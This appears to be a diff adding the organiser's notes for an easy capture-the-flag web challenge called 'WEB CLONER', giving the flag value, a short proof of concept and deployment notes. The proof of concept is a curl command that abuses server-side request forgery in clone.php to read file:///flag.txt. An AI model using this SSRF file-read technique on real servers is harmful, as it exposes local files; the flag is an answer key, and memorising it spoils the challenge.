@@ -1,0 +1,14 @@
+Challenge Name: WEB CLONER
+Challenge Desc: -
+Challenge Author: encrypt0r
+Category: WEB EXPLOITATION
+Flag: ACTCTF{cbc93d96101bbc78d4c9c1dcbc01015f2f5afd17aabff4f44dd9b2abb80bf7fd}
+Level: EASY
+Attachment: FALSE
+--------------------------------------------------------
+POC:
+1. SSRF, request ke file:///flag.txt (curl -LX POST -d "url=file:///flag.txt" http://{HOST}:8083/clone.php)
+2. Akses web yg di clone
+
+How to deploy:
+1. Deploy pake php 8.0
